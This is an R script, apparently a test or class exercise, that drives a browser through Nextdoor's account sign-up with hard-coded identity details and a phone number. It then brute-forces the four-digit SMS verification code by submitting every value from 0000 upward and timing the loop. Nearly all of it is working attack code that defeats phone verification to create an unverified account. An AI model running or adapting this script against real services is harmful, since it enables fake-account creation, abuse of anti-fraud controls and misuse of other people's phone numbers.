library(RSelenium)
library(rvest)
library(dplyr)
library(timeR)                                    #to time my program

timer1 = createTimer(precision = "ms")
timer2 = createTimer(precision = "ms")
timer1$start("full")

rD = rsDriver(browser="firefox", port=4544L, verbose=F)                
remDr = rD[["client"]]
remDr$navigate("https://nextdoor.com/")

email = "bdaa.nextdoor+brute3@gmail.com"
address = "156 E 13th"
fName = "Jane"
lName = "Hardy"
password = "BDAApass"
phone = "(614)267-6742"


Sys.sleep(1)
remDr$findElement(using = "css", value = "input[class = 'select-display-block']")$sendKeysToElement(list(address))
Sys.sleep(1)
remDr$findElement(using = "css", value = "input[class = 'select-display-block']")$sendKeysToElement(list(key = "down_arrow"))                               #gets past address page
remDr$findElement(using = "css", value = "input[class = 'select-display-block']")$sendKeysToElement(list(key = "enter"))    
remDr$findElement(using = "css", value = "input[class = 'nux-signup-address-chooser-email-field fs-block']")$sendKeysToElement(list(email))
remDr$findElement(using = "css", value = "button[class = 'css-3tna2']")$clickElement()
Sys.sleep(4)

remDr$findElement(using = "id", value = "1")$sendKeysToElement(list(fName))
remDr$findElement(using = "id", value = "2")$sendKeysToElement(list(lName))
remDr$findElement(using = "css", value = "input[class = 'nux-signup-account-creator-gender-button']")$clickElement()                            #gets past info page
remDr$findElement(using = "id", value = "3")$sendKeysToElement(list(password))
remDr$findElement(using = "css", value = "button[class = 'css-1yechgf']")$clickElement()
Sys.sleep(4)


remDr$findElement(using = "css", value = "input[class = 'nd-textfield-input']")$sendKeysToElement(list(phone))                                    #gets past phone page
remDr$findElement(using = "css", value = "button[class = 'phone-ask-nux-button css-1yechgf']")$clickElement()
Sys.sleep(4)


url = remDr$getCurrentUrl()
num = 0000

timer2$start("loop")

while (url == "https://nextdoor.com/verify"){
  num = toString(formatC(num, width=4, flag="0"))
  remDr$findElement(using = "id", value = "1")$clearElement()
  remDr$findElement(using = "id", value = "1")$sendKeysToElement(list(num))
  remDr$findElement(using = "css", value = "button[class = 'phone-code-nux-button css-1yechgf']")$clickElement()
  Sys.sleep(0.11)
  num = as.double(num)
  num = num +1
}

timer1$stop("full")
timer2$stop("loop")
getTimer(timer1)
getTimer(timer2)


remDr$close()
rm(rD)          #closes and quits the server
gc()